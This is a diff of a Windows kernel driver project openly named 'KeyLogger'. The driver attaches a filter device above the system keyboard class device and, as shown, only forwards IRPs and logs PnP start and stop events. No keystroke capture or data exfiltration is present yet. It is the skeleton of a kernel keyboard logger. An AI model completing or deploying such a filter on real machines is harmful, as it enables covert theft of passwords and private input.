@@ -1,29 +1,56 @@
 #include <ntddk.h>
 #include <tchar.h>
 
-#define DEVICE_NAME _T("KeyLogger")
-#define DEVICE_PATH _T("\\Device\\") DEVICE_NAME
+#pragma warning(disable: 5045) //Disable Spectre
 
-#define KEYBOARD_DEVICE_NAME _T("KeyboardClass0")
-#define KEYBOARD_DEVICE_PATH _T("\\Device\\") KEYBOARD_DEVICE_NAME
+#define DEVICE_NAME						\
+	_T("KeyLogger")
 
-#define SYM_LINK_NAME _T("\\DosDevices\\KeyLogger")
+#define DEVICE_PATH						\
+	_T("\\Device\\") DEVICE_NAME
 
-typedef struct _DEVICE_EXTENSION
+#define KEYBOARD_DEVICE_NAME				\
+	_T("KeyboardClass0")
+
+#define KEYBOARD_DEVICE_PATH				\
+	_T("\\Device\\") KEYBOARD_DEVICE_NAME
+
+#define SYM_LINK_NAME					\
+	_T("\\DosDevices\\KeyLogger")
+
+#define NULLASSERT(p)					\
+	if (!p) return STATUS_BUFFER_ALL_ZEROS
+
+#define NOTUSED(var)					\
+	(VOID)var
+
+#define LOG(msg)						\
+	DbgPrint(" === " msg " === ")
+
+
+struct _DEVICE_EXTENSION
 {
 	UNICODE_STRING symbolicLink;
-} DEVICE_EXTENSION, *PDEVICE_EXTENSION;
+	PDEVICE_OBJECT pTargetDeviceObj;
+};
 
-NTSTATUS addDeviceRoutine(_In_ PDRIVER_OBJECT pDriverObject, _In_ PDEVICE_OBJECT pPhysicalDeviceObject)
+typedef struct _DEVICE_EXTENSION DEVICE_EXTENSION;
+typedef DEVICE_EXTENSION *PDEVICE_EXTENSION;
+
+
+NTSTATUS
+AddDeviceRoutine(
+	_In_ PDRIVER_OBJECT pDriverObject,
+	_In_ PDEVICE_OBJECT pPhysicalDeviceObject)
 {
-	(VOID)pPhysicalDeviceObject;
-	(VOID)pDriverObject;
+	NOTUSED(pPhysicalDeviceObject);
+	NOTUSED(pDriverObject);
 
 	UNICODE_STRING deviceName;
 	RtlInitUnicodeString(&deviceName, DEVICE_PATH);
 
 	PDEVICE_OBJECT pDeviceObj;
-	NTSTATUS returnedStatus;
+	NTSTATUS returnedStatus = STATUS_SUCCESS;
 
 	returnedStatus = IoCreateDevice(
 		pDriverObject,
@@ -37,37 +64,94 @@ NTSTATUS addDeviceRoutine(_In_ PDRIVER_OBJECT pDriverObject, _In_ PDEVICE_OBJECT
 	if (!NT_SUCCESS(returnedStatus))
 		return returnedStatus;
 
+	PDEVICE_EXTENSION pDeviceExtension = pDeviceObj->DeviceExtension;
+	NULLASSERT(pDeviceExtension);
+
 	UNICODE_STRING targetDeviceName;
 	RtlInitUnicodeString(&targetDeviceName, KEYBOARD_DEVICE_PATH);
 
 	PFILE_OBJECT pFileObj;
-	PDEVICE_OBJECT pTargetDeviceObj;
-
 	returnedStatus = IoGetDeviceObjectPointer(
 		&targetDeviceName,
 		FILE_READ_DATA,
 		&pFileObj,
-		&pTargetDeviceObj);
+		&pDeviceExtension->pTargetDeviceObj);
 
 	if (!NT_SUCCESS(returnedStatus))
 		return returnedStatus;
 
-	IoAttachDeviceToDeviceStack(pDeviceObj, pTargetDeviceObj);
+	IoAttachDeviceToDeviceStack(pDeviceObj, pDeviceExtension->pTargetDeviceObj);
 
-	returnedStatus = IoCreateSymbolicLink(&((PDEVICE_EXTENSION)pDeviceObj->DeviceExtension)->symbolicLink, &deviceName);
+	returnedStatus =
+		IoCreateSymbolicLink(&pDeviceExtension->symbolicLink, &deviceName);
 
 	if (!NT_SUCCESS(returnedStatus))
 		return returnedStatus;
 
-	return STATUS_SUCCESS;
+	return returnedStatus;
 }
 
 
-NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT pDriverObject, _In_ PUNICODE_STRING pRegistryPath)
+NTSTATUS
+ForwardingIRP(
+	_In_ PDEVICE_OBJECT pDevObj,
+	_In_ PIRP pIrp)
 {
-	(VOID)pRegistryPath;
+	IoSkipCurrentIrpStackLocation(pIrp);
 
-	pDriverObject->DriverExtension->AddDevice = addDeviceRoutine;
+	PDEVICE_EXTENSION pDeviceExtension = pDevObj->DeviceExtension;
+	NULLASSERT(pDeviceExtension);
+
+	return IoCallDriver(pDeviceExtension->pTargetDeviceObj, pIrp);
+}
+
+
+NTSTATUS
+PnPHandler(
+	_In_ PDEVICE_OBJECT pDevObj,
+	_In_ PIRP pIrp)
+{
+	PIO_STACK_LOCATION pIrpStackLocation =
+		IoGetCurrentIrpStackLocation(pIrp);
+
+	NULLASSERT(pIrpStackLocation);
+
+	switch (pIrpStackLocation->MinorFunction)
+	{
+		case IRP_MN_START_DEVICE:
+		{
+			LOG("Driver: start");
+			break;
+		}
+
+		case IRP_MN_STOP_DEVICE:
+		{
+			LOG("Driver: stop");
+			break;
+		}
+	}
+
+	return ForwardingIRP(pDevObj, pIrp);
+}
+
+
+NTSTATUS
+DriverEntry(
+	_In_ PDRIVER_OBJECT pDriverObject,
+	_In_ PUNICODE_STRING pRegistryPath)
+{
+	NOTUSED(pRegistryPath);
+
+	NULLASSERT(pDriverObject);
+	NULLASSERT(pDriverObject->DriverExtension);
+	NULLASSERT(pDriverObject->MajorFunction);
+
+	pDriverObject->DriverExtension->AddDevice = AddDeviceRoutine;
+
+	for (INT i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; ++i)
+		pDriverObject->MajorFunction[i] = ForwardingIRP;
+
+	pDriverObject->MajorFunction[IRP_MJ_PNP] = PnPHandler;
 
 	return STATUS_SUCCESS;
 }
